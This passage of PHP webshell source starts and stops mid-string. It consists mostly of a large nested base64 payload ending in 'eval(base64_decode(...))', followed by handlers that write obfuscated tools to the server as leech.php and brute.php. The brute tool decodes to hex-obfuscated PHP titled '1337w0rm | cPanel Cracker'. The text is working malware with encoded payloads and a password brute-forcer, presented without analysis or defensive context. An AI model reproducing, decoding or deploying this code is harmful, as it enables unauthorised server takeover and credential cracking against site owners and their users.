ZEtXR1ZJY0ZoaVIyaFFXVEJrVjJSR1dsaFBWWFJUWWtWc05GWnRkR3RpTURGWFZXeHNWMkpZUWs1
WlZtUlBUV3hPZFdGNlJteGlWa3BLVlRJMVEyRnNUa1pPV0hCWVZtMW9VRmxxUm5kWFZsSllUMVYw
VTFZeFNqTldNVnBoVlRKV1dGSnNVbWhOTUVwTldWZDBWMDB4VWxaVWFrNXBZVE5DVlZkWWNHdFNW
bFpZVDFWMFVrMVZXbmxWTWpGaFZXc3hSbVJGVWxaV00xSk1WVlJHYTFZeVRYbFVXR3hYVmxSV1JW
ZHFTakJUTVVWNFVtNU9UMDFHU2xOWmFrSjNVa1pXV0dSRmRGSk5WMUpZV1ZjeFIxTkZPVWhhUlhS
c1ltMW9kMVV4Vm05VU1ERklWbXhvYkZJemFGSldWRUozWTFac2NWTnFVbXRpVlRWNFdXcEtkMWxY
U2xkalNGSllZbFJHYUZsc1ZuTmpWVFZXWlVkb1VrMVhlSGhXUm1SM1ZXc3hSazlJYkU5V2VsWkxW
VEJhUzJSc1RuUmlSVFZPVFVSc1JsZFljRWRWUjFaV1UyNUdXbFpYYUZoVWJGWjNZMFpTVlZSc1Fs
TlNNREUwVmtod1NrMUZPVVprTTJ4VVZUTlNURnBYTlU5VU1VVjVXa2hLVkdFd05WTlphMUp6VWxa
V1dFOVZkRkpOVlZwNlZERldVMVZ0U1hkalJWSldWak5vZWxZeFVrdGlNbEp5WWtWU1dtVnRhSEZV
VjNNeFRsWnNWMkZGVGs1U2Ewb3dWbGMxWVZkck1IaFhha0pZWWtkTmVGUlZWalJrUms1MVYyMUdW
Rkl6VVhoWFdIQkxWREpXV0ZOWWJHeFRSVFZZVlc1d2MwMHhWa2RhUms1cllrZDBObFp0TlZOWlZs
bzJWbGhrVlZKNlJreGFSM2gzVTFkRmVsWnRjRTVoZWxVeFYxZHdTMDVIVFhoVWEyaFhZbXRLYUZS
WE1XNWtNVlpHVkZSV2JHSkhkRFpWTWpWRFlXeE9SMUpZU2xSaWJrSTJWa2QwVDJKdFJYZGpSVkpY
WlcxNGQxWXdVa3RaVjAxNVZXeHNWV0pVYkUxVlZFcDZUVEZLUjFKdVdsUmhNRFZUV1d0amVHRldU
a2RYYWxwYVZsVTFkVmt3VlRWTk1ERkdaRVZTVmxZell6RlZhMXBIWkd4T2RGZHNTazVTV0ZKRlZs
WlNRMVJHUlhoYVIwWk9WakJ3TUZaSGNFTmhSbG8yWWtSR1ZGWldhekZWYTJSSFUxWmFjVlp0Umxk
bGJFb3lWVEowWVZVeVNYbFZiRnBPVmtWYVlWcFdhR3RqYkZaVlUyMDVUbFl4V2xsV2JUVlhWVEZK
ZUZkcVJsUk5WVll6VlhwQ1QxZFhUWGRPVlZKaFRXNVNURlpXVm10WlZURklWR3RrVUZkR1NtOVVW
M2hMWkRGcmVXSkhOV2hOYkVwSldWVm9RMkZ0VmxWUldFcFdaV3R3V0ZSVldsTmtSVGxaVVdzeFVr
MVZjRVpYVmxadlZqQTFWMk5HYUU5V1ZscG9WbTV3VTJReFVYcFpNMlJVVFVVMVUxbFVTakJWTVVs
M1YycEdXbFpXY0ZCWlZWcHlaVlp3Tm1KRmRGUlNhM0F5VjFaYWIxUnRVa2RSYmtwV1lsZG9jRmxz
Wkc5V1ZtUlhXa1U1YVUxSVVrVldWM2hYWVVaT1IxZHJPV0ZTYlZKUFdUQlZOVTB3TVVaa1JWSldW
ak5vTUZkWGNFOVRNa3BIWWtab1ZXSlViRTFWVkVaTFVteGtWMWw2Um1sTlZsWTFWVzB4ZDJGR1JY
ZFRiVGxhVFRKNFExbFVSa3BsVjBwSVlVWmtWRkpZUWpOVmVrWkdaREZOZDFSc1NtbFNSMUpHVmxa
ak5WTXhSWGhTYms1cVVtNUNkMVZXWXpWaFJtUkdUbGN4V0dFeVVucGFWbFl3VWtaV2MxWnRhRlJT
YkhCUVYydGFhMVJ0VWxaalJGWlFVbnBXVGxsV1drdFRWbXhYV2tWa1YxWXdOVEJaVkU1RFUyeEZl
R0pJVWxSV1ZUVlVWVEJrUjFkR1NuTldiWEJwVmpOU2RsWlZXazloYlZKV1pVaENXazF0VWt4WlZs
cHpZbXhPY2xadGRHcFNiWGhZVmxjMWMyRkdWWGRXVkZaVVltMXpkMWx0ZERCVmF6RkdaRVZTVmxZ
elVreFhiR2hxWkRGTmQxUnNTbWhOU0VKRlZtcEdZV05XYkZaWmVsSmhUVWhCTWxwVlpITmhiVVpX
VW1wS1ZsSXpRVEJaVm1SUFkwWkdXVmRzUm1sU2Exb3dWVEZvZDJGck5VWk9WVlpUVmtkU2NGcFdW
a3BrTVd4V1ZHeHdhR0Y2VmtaV1JtaHpWVWRXVmxOcVFsUmlWM2hQVkZSQk5WWldSbFZXYkVKT1lY
cEdkVlpWVm10VGJHOTVWRmh3Vm1Gc1duQlZha1pXVGxaT1dFMVZPV3RpVlhCSlZERm9jMVZIU2xo
VmFsWllZa2RTV0ZwR1ZuTmpWVFZJVGxVeFVrMVZjRXBYVmxwclVqRmFXRlJ1VW1oTk1EVk1XbGMx
YTAxc1pGaGlla0pwWVhwcmVsUlZWakJTUmxaWVpFVjBVazFWTlZSVVZXUkhVMGRLU1dORk1WZFNS
bHAwVmxaU1MySXdNVmhXYkdoWFlteGFUVlZVUmt0V2JHeFdZVVprVldKV1NsbFdSbWhYVXpKV1ZX
RklWbFZTTW5oVVZUQmtSMWRHU25OV2JYQnBWak5TTmxVeWRGZFVNa2w1Vld4c2FWSXphSEJaVkVa
TFl6RnNkR0Y2UW1saE0yY3hWMVJPVjFNeFNsaFZibVJZVm14d1ZGcFdaRWRXUjBZMldrVldWbFo2
YkV4VlZFWkhZekE1VmxWc1NtbE5TRUpGVmxaa05HTXhiSEpoUlRscFVqQmFXVll4Wkd0VVJrVjRV
MnRzV2xadFVraFdiR1JQWkVkRmVXRkdSbFpOYXpSNFZrVmtjMkZzYjNkalNFSllWakpTVEZWc1pG
TmtNV1JYVjJ4T2JGWXdXbFZWYkZKelV6SldWVlZ1VmxSTlZWWXpWWHBDVDFWdFJYZGpSM2hyWld0
S1RWVlVSa2RqYkU1eVZHeG9WMkpZUW05VmJuQnZZbXhPZFdORVVtaFdNRFY0Vkd0amVGTnRWbkpo
TTNCVlZqTkJkMWxWWkV0a1JtdDVXa1p3VG1KWFpEUlhiRnBQVjIxR2NrNVVXbUZsYXpWUVZtdG9V
MDFXVGxaaFJrcHBWbGQzTWxkWWNGTlVNVnBHVFVST1drMUZOVVJVVldSSFYwVTFTRnBHUmxOTlIz
UjVWVEkxYzA1SFZuUlZhMnhVWW10S2NWVXdWVEZsYkdSWFlVVTVhVTFZUWxwV1JtTTFVekZLV0ZW
dVpGaFdiSEJVV2xaa1IxWkhSWHBXYTNSc1ltMVJlVll4WkhaTlJtOTNaVVpTVWxaNlZsRmFTSEJE
VkVaRmVGSnVTbFJoTURWWlZERmtjMWRWTVhOalNIQmhVbTFvVUZscVFqQlNSMFkyV2tWV1ZsWjZi
RXhWVkVaSFkyeE9jMk5JVW14U1JWcHhWRmN4YTJSc1RYaFZibkJWWVRBMWRWbFVRbmRTUmxaWVpF
VTVVazF0VW5sVk1uUlBWVzFLU1ZGdFJtaFdWVm95VmxaV2ExbFZNVWhVYTJSUVZucEdjVlV3V2xw
a01VMTNWR3hPVGxJd1drbFphMmgzVkZaYVJWWnJNVmhpUjJoVVZrUktTbVZYUlhwVWEzUlRWbFJX
TWxkcldtOWpNa3BJVTI1S1ZtSllhSEJaVmxKVFpGWlNTV0pIY0d0V01ERTJWbGMxYzJGR1pFWlRh
bHBhWVRKU1NGcFhNVWRUUmxwMVkwVjRVazFWY0VwWFZscHJVakZhV0ZSdVVtaE5NRXBPVldwR2Qw
MXNhM2RhUm1SclZsaFNSVlpYZUZkaFJrNUhWMnM1WVZKdFVrOWFSbFozVGxVNVNFNVZNV2xoZWxJ
elYxUkplR015VVhsVVdHeHNVakpvY1ZSWE1XOWpNV3Q2WWtjMWFFMVZiRFZaYTJSdlZqRk9SbU5J
WkZSTlZUUjZXVzB4VDJOR2EzcFJhekZUVm01Q1YxWnNWbHBPVmtWNFZHeGFUMVpWY0ZkWmEyUXda
REZOZUZKWVpGUk5SVFZUV1ZSQ2QxSkdaRWxVYXpsU1RXMVNlVlV5ZEU5VmJVVjNZMGRHVjAxRVZq
SlhWelZ6VVcxS2MxRnJhRlJXTWxKeFZGUkdTazFXYkhKYVJscFFWbGQ0TUZaSE5XRmhWa28yWWtS
V1ZVMXFWa3haYTFwM1VrWk9WR1JGZEdoV1ZFVXhWa2MxZDFOck5IZGpTRUpWVjBkNFQxbFhNVTVO
TVU1V1drVTVhVTFzU2xwWlZFbDRVMjFXZEZSVVFsVmlia0pYVkdwS1MyTlhVWHBYYkhCb1lXeEtk
VlV5TlhOT1IxWjBWV3RzVkdKclNuRlZNRlV4Wld4a1YyRkZPV2xOV0VKYVZrWmpOVk14U2xoVmJt
UllWbXh3VkZwV1pFZFdSMFY2Vkd0MGJGWlZXWGRWTVZaUFlXMU5lR05JVW1sVFJUVm9WakJWTVdR
eGNGaE5WbHBwVFVoQ1NGWlhNRFZoTVZwVlVsaG9XRmRIYzNkWmJYUTBUbFpyZWxadGNFNU5WVzh4
VjFaYWIxRXlWblJUYTJoVFltNUNiMVZxUm1GT2JFMTNWR3hPVkZJd1dsbFZiWGhYWVcxS1dHUkla
RlJOVmtWM1drUkNjMUpWT1VoYVIwWnBZa1Z2ZWxZd1VrOVVNazVJVm01U1YxWjZiRXhWTUZwTFpH
eHNWMkZGTld0U2EwcDVXa1ZrTkdFeFNsVldha3BhVm1zMGVsbFVSa1psVjBaRlVtMTRWMDFXYjNo
V1YzUnJWakpTVm1WSVFscE5NWEJNV2xaU1YwNXNjRVpoUlhScVVqQTFTbFpITlU5WGJHUkdUbGhh
V0dKSGFFOVpha0ozVW14d1NWRnNjRmRpUlc4eFYxWmFUMk50VGtaa00yeFlZbXRLY0ZWcVJtRk9i
R3hYWVVoa2FWSllVa1ZXVjNoWFlVWk9SMWRyT1dGU2JWSlBXa1pXZDA1Vk9VaE9WVEZwWVhwU00x
ZFVTWGhqTWxGNVZGaHNiRkl5YUhGVVZ6RnZZekZyZW1KSE5XaE5WV3cxV1d0a2IxWXhUa1pqU0dS
VVRWVTFlVmt4VlhoV1ZrWlpXa1Z3VTFKNmJIVldSbHBUVVcxUmQyVkZVbHBOYm1oTVdsYzFUMVF4
UlhsYVNFcFVZVEExVTFsclVuTlNWbFpZVDFWMFVrMVZXbmxWTW5oM1YwZFdTV05IUmxaV1JVcE5W
VlJHUjJOc1RuSlViR3hxVFVSV1JWZHFTakJUTVVWNFVtNUtWR0pJUWxsV1J6QTFZVmRXVmxKdVZs
WlNWMUpMVjJwS1RtVnNWbkZXYld4VFRWWlZNVlV4WTNoVU1sSjBVMnRvVUZkSGVGRlpWbFV4WkVa
a2RFMVhSbWxXYmtJd1ZqRmtjMVZYUlhwVmJscFVZbGQ0VDFwV1ZURlNWbFpWV2tkc2FWWXdOWFZY
YTFaclltMUtWbUpFV2xwbGJFcFFXbGQ0VmsweFRsWmFSVGxwVFd4S1dsbFVTWGhUYlZaMFZGUkNW
V0p1UWxkVWFrcExZMFpLVldGRk1VNWhNblI1VlRJMWQyVnNVbkpVYlRWb1RVaENSVlpXWkROT1Zr
cEhVbTVhVkdFd05WTlphMUp6VWxaV1dFOVZkRkpOVlZwNldXdGFjbVZYUmtsWGEzQlNUV3N3TUZk
WWNFdFVNbFpZVW14c1VtRnJTbEpaYkZwTFRXeGtWVlJzWkd0U2JrSlpWR3hTUTFSWFNsWmpSRXBZ
WVRKb2VWcEdaRTVsVmxKMVlrZHNUbUp0YURaV2JYUnFUbGRSZUZGc2FGWmliSEJoVkZSR1lVMUda
SE5aZWtaT1VsaG9NRlV5TldGWlZrNUlaRVJHV21WcmNGQmFWbVJLWlZkV1NWUnNVbE5OVm5BelZq
SndTMkl3TVVkUmExSlFWMGhDWVZSVVFuZGtNV3QzWVVaS1RFMUlRVEpaZWtFeFVrWnZlV1JGZEZK
TlYwMHhXVlphYm1WV1pIVlViWFJZVWxSV01sVjZRazlqYXpSM1ZXeEthVTFJUWtWV1ZtUTBaRVpz
Y21GR1pHeGlWVnBGVjJwT1ExVkhValpSYTNoU1RWVmFlbFF4VmxOVmJVbDNZMGN4VmxaRlNrMVhi
WGhHVDFaQ1ZGbDZaRXBTTVZsNVYxWmtNMkl4YkhSU2JuQmhWa1pyZDFkRVNsTmlSbXQ1VDFkMFlW
VXlaSEpYVms1eVkwVTVOVkZUT1ZGYWVrSk1TbnB6WjFwWVdtaGlRMmhwV1ZoT2JFNXFVbVphUjFa
cVlqSlNiRXREVW1oTFUyczNTVVE0SzBSUmJ6MG5PeUJsZG1Gc0tHSmhjMlUyTkY5a1pXTnZaR1Vv
SkdFcEtUc2dQejROQ2c9PSc7IGV2YWwoYmFzZTY0X2RlY29kZSgkYSkpOyA/Pgo=
';
    $file       = fopen("leech.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=leech.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'brute') {
    $file       = fopen($dir . "brute.php", "w+");
    $perltoolss = 'PD9waHAgJHsiXHg0N0xceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJ5XHg3NFx4NzFceDczaVx4NjRceDYydXdceDYyIl09InVzIjskeyJceDQ3TFx4NGZCXHg0MUxTIn1bImZceDc5Z2ZceDc3XHg2Nlx4NzBceDcwIl09Ilx4NjMiOyR7IkdMXHg0ZkJBXHg0Y1MifVsieFx4NzNzdWtceDY1XHg3NFx4NjhceDZjXHg3OCJdPSJjXHg2Zlx4NmVmaVx4Njd1XHg3Mlx4NjFceDc0XHg2OVx4NmZuIjskeyJceDQ3TE9CXHg0MVx4NGNTIn1bInpceDZlbFx4NjZjXHg2NyJdPSJceDYzXHg2Zlx4NmVceDczeVx4NmQiOyR7IkdMXHg0Zlx4NDJceDQxTFMifVsieFx4NzJceDZlXHg3MnFceDZlXHg2NVx4NjVxeVx4NjZceDZlIl09Ilx4NjRceDY5XHg3MiI7JHsiXHg0N0xceDRmQlx4NDFceDRjUyJ9WyJceDc5XHg3OVx4NzhwXHg2N1x4NzRceDY5XHg2NmIiXT0iXHg3Mlx4NzQiOyR7IkdceDRjXHg0Zlx4NDJBXHg0Y1x4NTMifVsiXHg3M2FceDY2XHg3M1x4NmVzXHg3MFx4NzRxIl09Ilx4NjciOyR7Ilx4NDdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2Zlx4NzRceDZkXHg3NndceDc1XHg3OXIiXT0iXHg3NVx4NzNceDY1XHg3Mlx4NzMiOyR7IkdMXHg0ZkJBXHg0Y1x4NTMifVsiblx4NjZkXHg2ZVx4NjlceDc5ZSJdPSJceDZjXHg2OVx4NmVceDZiIjskeyJceDQ3TFx4NGZceDQyXHg0MUxTIn1bIlx4NmNceDY3XHg2M1x4NmRra2oiXT0iXHg3Mlx4NzIiOyR7IkdceDRjXHg0ZkJBXHg0Y1MifVsiXHg3NVx4NzVvZVx4NmNceDY0XHg2Y1x4NjhceDZlIl09Ilx4NzIiOyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg3MnNoZnJlc2xceDY4XHg2ZHgiXT0iXHg3M1x4NjFceDY2XHg2NV9ceDZkXHg2Zlx4NjRceDY1IjskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIm1ceDZhXHg2YWpceDczXHg3OWMiXT0iXHg3M2FmXHg2NVx4NWZtXHg2ZmRceDY1IjskeyJceDQ3TE9ceDQyXHg0MVx4NGNTIn1bIlx4NjhceDcycVx4NzBceDZhXHg2YyJdPSJwXHg2MVx4NzNzIjskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNTIn1bIlx4NmRwXHg2Ylx4NzF6XHg2MnVceDY0XHg3OXNceDY1Il09InVceDczZVx4NzIiOyR7IkdMXHg0Zlx4NDJceDQxTFMifVsiXHg3M3JceDcwdVx4NjNceDYzXHg3NW5nIl09ImExIjskeyJceDQ3XHg0Y09ceDQyXHg0MUxTIn1bIlx4NmJceDcwbVx4NjJceDcyXHg2Zlx4NjQiXT0ib2siOyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1MifVsiXHg3Mlx4NzJceDZiXHg2Nlx4NzZceDc1eVx4NzQiXT0iXHg2OVx4NjQyIjskeyJHXHg0Y1x4NGZceDQyQUxTIn1bIlx4N2FceDZkXHg2NVx4NzJsXHg2N1x4N2FrIl09Ilx4NjEyIjskeyJHTFx4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NmNceDczY2NceDc4XHg3Mm5ceDYyXHg2OHciXT0iXHg3NXNceDY1XHg3Mm5hXHg2ZFx4NjUiOyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg2ZmlceDYyXHg2Mlx4NjZ1XHg2M1x4NjRceDYzIl09Ilx4NzZhbFx4NzVlIjskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxceDUzIn1bIlx4NzVceDYzblx4NjlceDYyZ3lceDY3XHg2NFx4NzEiXT0iXHg2NSI7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjXHg1MyJ9WyJqXHg2ZVx4NzdceDc0XHg2NFx4NmFlXHg2MiJdPSJhXHg3NHQiOyR7IkdceDRjXHg0Zlx4NDJceDQxTFx4NTMifVsicVx4NmZ3XHg2NVx4NzNceDY0cCJdPSJceDczXHg2MWhceDYxXHg2M1x4NmJceDY1XHg3MiI7JHsiXHg0N1x4NGNPQlx4NDFMXHg1MyJ9WyJceDc0XHg3Nm9pXHg2NHNceDc0Il09Ilx4NzBceDYxdFx4NjhceDYzXHg2Y1x4NjFceDczXHg3MyI7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjUyJ9WyJ0XHg3MFx4NzlldFx4NmNyIl09ImZceDcwIjskeyJceDQ3TE9ceDQyXHg0MUxceDUzIn1bIlx4NmNceDc2XHg3NFx4NjZceDZhXHg2OXNceDZiXHg3NyJdPSJjb1x4NjRlIjskeyJceDQ3XHg0Y09CXHg0MUxceDUzIn1bIlx4NzNceDZiem1ceDZhXHg3MFx4NzlceDY3XHg2MmRceDYyIl09Ilx4NzJceDY1cyI7JHsiXHg0N1x4NGNPQlx4NDFMXHg1MyJ9WyJwXHg3N1x4NjRceDY2XHg3Nlx4NzBceDZlXHg2OWRceDY0Il09ImFyIjskeyJHXHg0Y09ceDQyXHg0MVx4NGNTIn1bIlx4NzNceDcxb1x4NzdceDYzcVx4NzgiXT0iXHg3Nlx4NjFceDZjXHg3NWVceDczIjskeyJHXHg0Y09ceDQyQVx4NGNceDUzIn1bIlx4NzdjXHg2N1x4NzJceDZibCJdPSJrXHg2NVx4NzlzIjskeyJceDQ3XHg0Y09CXHg0MUxTIn1bIlx4Njl2a1x4NzZ0XHg2OVx4NjRuXHg2ZSJdPSJceDZldVx4NmQiOyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiYlx4NzRceDc5XHg2N1x4NzdceDZjdSJdPSJceDcxXHg3NVx4NjVceDcyXHg3OXMiOyR7Ilx4NDdceDRjT0JceDQxXHg0Y1MifVsiXHg3OVx4NzVpXHg3MmRceDYzXHg2NVx4NjhceDcydnUiXT0iXHg3M1x4NzFceDZjIjskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIlx4NmRceDZlXHg2ZHpceDcydFx4NjRsXHg3MyJdPSJceDY4XHg2NVx4NjFceDY0IjskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bImtceDY3XHg2YXJqXHg3OFx4NzFceDczXHg2MiJdPSJtXHg2OVx4NmRceDY1X1x4NzRceDc5XHg3MGUiOyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1MifVsiXHg3N3FceDcwXHg3N1x4NzlceDY0XHg3NFx4NmQiXT0iXHg2M1x4NmZceDZlXHg3NFx4NjVudF9ceDY1XHg2ZVx4NjNvXHg2NFx4NjlceDZlZyI7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDZiXHg2Zlx4NzJceDY4a2htXHg2NWdceDZlXHg3NCJdPSJceDY2aVx4NmNlZFx4NzVtcCI7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjUyJ9WyJceDczXHg3N1x4NzNyXHg2Zlx4NzdtIl09ImZceDY5bGVuYVx4NmRceDY1IjskeyJHXHg0Y09ceDQyXHg0MUxceDUzIn1bIlx4NzJceDc0cm5ceDZkXHg3M3dceDcyZ2JceDc0Il09Ilx4NjZpXHg2Y1x4NjUiOyR7Ilx4NDdMXHg0Zlx4NDJBTFx4NTMifVsiXHg3OG1jXHg2OFx4NzhceDc3XHg3M1x4NzByIl09Ilx4NzYiOyR7IkdMXHg0Zlx4NDJBXHg0Y1MifVsiXHg2Zlx4NzlrXHg3M3NsanRceDc2XHg2Y3oiXT0iXHg2YiI7JHsiXHg0N1x4NGNPXHg0MkFceDRjUyJ9WyJceDczXHg3YVx4NjZ5XHg2YW9ceDcwIl09ImkiOyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg3NVx4NmZceDcxZ1x4NzBuXHg3OG9iXHg2OVx4NzFoIl09Ilx4NzRceDYxXHg2Mlx4NmNlIjskeyJHXHg0Y09ceDQyXHg0MUxceDUzIn1bImZceDYyXHg2MVx4NjdceDc4b1x4NjlceDZkY1x4NjYiXT0iXHg3MXVceDY1cnkiOyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFx4NTMifVsialx4NzVceDc4XHg3M1x4NjJceDcwIl09Ilx4NjVceDcyXHg3Mlx4NmZceDcyIjskeyJceDQ3XHg0Y09CQUxceDUzIn1bInNceDY3XHg3OVx4NmJceDZmZ1x4NjdceDZjXHg2ZXJceDY0Il09InN0XHg3MiI7JHsiR0xPXHg0MkFceDRjXHg1MyJ9WyJceDcwXHg2OHltXHg3YVx4NjlzXHg3NFx4NzVceDc1XHg3MSJdPSJjXHg2OGVceDYzXHg2Ylx4NjVceDY0IjskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNceDUzIn1bIlx4NjhceDcyc3dceDc3clx4NjNceDcwXHg3Mlx4NzciXT0iXHg3Mlx4NjVceDc0IjskeyJceDQ3TFx4NGZceDQyXHg0MVx4NGNTIn1bIlx4Nzd1XHg3OVx4NzN0cnQiXT0idFx4NzlceDcwZSI7ZWNobyAiXHgzY1x4Njh0XHg2ZFx4NmNceDNlXG48dFx4Njl0bFx4NjVceDNlXHgzMVx4MzMzXHgzN3cwXHg3Mlx4NmRceDIwfCBjUFx4NjFceDZlXHg2NWxceDIwXHg0M3JceDYxY1x4NmJceDY1XHg3Mlx4M2MvdFx4NjlceDc0bFx4NjVceDNlXG5ceDNjbVx4NjV0XHg2MSBceDY4dFx4NzRwLVx4NjVceDcxdWlceDc2XHgzZFx4MjJceDQzXHg2Zm5ceDc0XHg2NVx4NmVceDc0LVR5cFx4NjVceDIyXHgyMFx4NjNceDZmXHg2ZXRlblx4NzQ9XHgyMnRlXHg3OFx4NzQvXHg2OFx4NzRceDZkbFx4M2IgXHg2M1x4NjhhcnNceDY1dD11XHg3NFx4NjYtXHgzOFx4MjJceDIwLz5cbiI7QHNldF90aW1lX2xpbWl0KDApO0BlcnJvcl9yZXBvcnRpbmcoMCk7ZWNobyJceDNjaFx4NjVceDYxZD5cblxuPHNceDc0eWxlPlxuXHQgXHgyMCAgXG5cdCBceDIwIFx4MjAvKlx4MjBSXHg2NXRuT0hceDYxY0sgMlx4MzBceDMxM1x4MjAqL1xuXG5cblx4MjAgICAgXHgyMCBceDIwICAgXHgyMGJvXHg2NHl7Y1x4NmZsb1x4NzI6I1x4MzY2XHg0NkYwXHgzMFx4M2IgZm9uXHg3NC1ceDczaVx4N2FlOlx4MjBceDMxXHgzMnBceDc4O1x4MjBceDY2XHg2Zm5ceDc0LVx4NjZhXHg2ZGlceDZjeTogc1x4NjVyaVx4NjZceDNiXHgyMGJceDYxY1x4NmJceDY3XHg3Mm9ceDc1XHg2ZWQtY1x4NmZsXHg2Zlx4NzI6IGJceDZjYVx4NjNceDZiXHgzYiBiXHg2MVx4NjNceDZiXHg2N3JceDZmXHg3NVx4NmVkLWlceDZkYWdceDY1OiB1XHg3MmwoXHg2OFx4NzRceDc0cDovL3dceDc3dy53YVx4NmNsXHg3M1x4NjF2XHg2NS5jXHg2Zm0vd1x4NjFceDZjbHBceDYxXHg3MGVceDcycy9ceDMxOVx4MzJceDMweFx4MzFceDMwODAvXHg2MVx4NmNceDY5XHg2NVx4NmUtXHg2ZVx4NjF0dXJlL1x4MzYwMTFceDM0XHgzNy9hbFx4NjllXHg2ZS1uXHg2MXR1clx4NjUtXHg2ZGF0cml4LTZceDMwMVx4MzE0XHgzNy5qcFx4NjcpO1xuXHRcdFx0XHRceDYyYWNrZ1x4NzJceDZmdVx4NmVkLVx4NzJceDY1XHg3MFx4NjVceDYxdDpceDIwbm8tclx4NjVceDcwXHg2NVx4NjF0XHgzYlxuXHRcdFx0XHRiXHg2MVx4NjNceDZiZ1x4NzJvXHg3NW5kLXBceDZmXHg3M1x4NjlceDc0XHg2OVx4NmZuOiBceDYyb3RceDc0XHg2Zm1ceDNiIH1cblx4MjAgXHgyMFx4MjAgXHgyMFx4MjAgICBceDIwIHRceDY0XHgyMHtceDYyb3JkZVx4NzI6XHgyMDFceDcwXHg3OFx4MjBceDczb1x4NmNpZFx4MjBceDIzXHgzMFx4MzBceDQ2Rlx4MzAwXHgzYiBceDYyXHg2MWNceDZiZ1x4NzJvXHg3NVx4NmVkLWNceDZmXHg2Y1x4NmZceDcyOlx4MjMwMDFmXHgzMDA7XHgyMHBceDYxZGRpblx4Njc6IDJweDsgZm9ceDZldC1ceDczXHg2OVx4N2FlOiAxXHgzMnBceDc4OyBceDYzXHg2Zlx4NmNceDZmXHg3MjogXHgyMzNceDMzRlx4NDYwXHgzMDt9XG4gICAgXHgyMCBceDIwXHgyMFx4MjBceDIwIFx4MjB0ZDpoXHg2Zlx4NzZlXHg3MntiYWNrXHg2N1x4NzJceDZmdVx4NmVceDY0LWNceDZmXHg2Y29ceDcyOlx4MjBceDYybGFceDYzXHg2Ylx4M2IgXHg2M29ceDZjb3I6ICNceDMzM1x4NDZceDQ2XHgzMFx4MzBceDNifVxuXHgyMCBceDIwXHgyMCAgXHgyMFx4MjBceDIwICAgXHg2OW5ceDcwXHg3NXR7YmFceDYzXHg2Ylx4Njdyb1x4NzVuXHg2NC1ceDYzb1x4NmNvXHg3MjogYlx4NmNhY1x4NmI7XHgyMFx4NjNceDZmbFx4NmZyOiBceDIzXHgzMFx4MzBGXHg0Nlx4MzAwO1x4MjBceDYyXHg2ZnJceDY0XHg2NXI6XHgyMDFwXHg3OCBceDczXHg2ZmxceDY5XHg2NFx4MjBceDcyZWQ7fVxuICAgXHgyMFx4MjAgICAgICAgXHg2OW5wXHg3NXQ6XHg2OFx4NmZceDc2XHg2NVx4NzJ7YmFjXHg2YmdceDcyXHg2Zlx4NzVceDZlZC1ceDYzXHg2Zlx4NmNceDZmXHg3MjogIzBceDMwXHgzNjYwXHgzMDt9XG4gIFx4MjBceDIwXHgyMFx4MjBceDIwIFx4MjBceDIwIFx4MjBceDc0ZXhceDc0XHg2MVx4NzJceDY1XHg2MXtceDYyXHg2MVx4NjNrZ1x4NzJvXHg3NW5ceDY0LVx4NjNvbFx4NmZceDcyOlx4MjBceDYybFx4NjFja1x4M2JceDIwXHg2M29ceDZjXHg2Zlx4NzI6ICMwMFx4NDZceDQ2XHgzMFx4MzA7XHgyMFx4NjJceDZmXHg3MmRceDY1cjpceDIwXHgzMXB4IFx4NzNvbFx4NjlceDY0XHgyMHJlZDt9XG5ceDIwXHgyMCBceDIwICAgXHgyMCBceDIwIFx4MjBceDYxXHgyMHtceDc0ZXhceDc0LVx4NjRlY1x4NmZceDcyYVx4NzRceDY5XHg2Zlx4NmU6XHgyMFx4NmVvblx4NjU7IGNvbFx4NmZyOiAjNjZGRjBceDMwOyBmXHg2Zlx4NmVceDc0LVx4NzdceDY1aVx4NjdceDY4dDpceDIwYlx4NmZsZFx4M2J9XG5ceDIwICAgXHgyMCBceDIwIFx4MjBceDIwXHgyMCBceDYxOlx4NjhvXHg3NmVceDcyIHtceDYzb2xvcjpceDIwXHgyM1x4MzBceDMwRlx4NDZceDMwXHgzMDt9XG4gIFx4MjBceDIwXHgyMFx4MjAgIFx4MjBceDIwXHgyMCBzZWxlY3R7XHg2MmFceDYza2dyb1x4NzVuXHg2NC1ceDYzXHg2ZmxvcjpceDIwYlx4NmNceDYxXHg2M1x4NmI7XHgyMGNceDZmbFx4NmZyOlx4MjBceDIzMFx4MzBceDQ2RjBceDMwO31cblx4MjAgICBceDIwXHgyMCBceDIwXHgyMCAgICNceDZkXHg2MVx4Njlue1x4NjJvXHg3Mlx4NjRlci1ib3RceDc0b1x4NmQ6IFx4MzFwXHg3OFx4MjBceDczXHg2Zlx4NmNpZFx4MjBceDIzM1x4MzNceDQ2XHg0NjAwXHgzYlx4MjBceDcwXHg2MWRceDY0XHg2OW5ceDY3OiBceDM1XHg3MHg7XHgyMHRlXHg3OHQtYWxceDY5Z246IGNlbnRceDY1XHg3Mlx4M2J9XG5ceDIwXHgyMCAgICBceDIwICBceDIwICAjbVx4NjFpXHg2ZSBhe1x4NzBceDYxZFx4NjRceDY5bmctXHg3MmlnaFx4NzQ6XHgyMDFceDM1XHg3MFx4NzhceDNiIGNvXHg2Y1x4NmZceDcyOiNceDMwXHgzMENceDQzXHgzMDA7IGZceD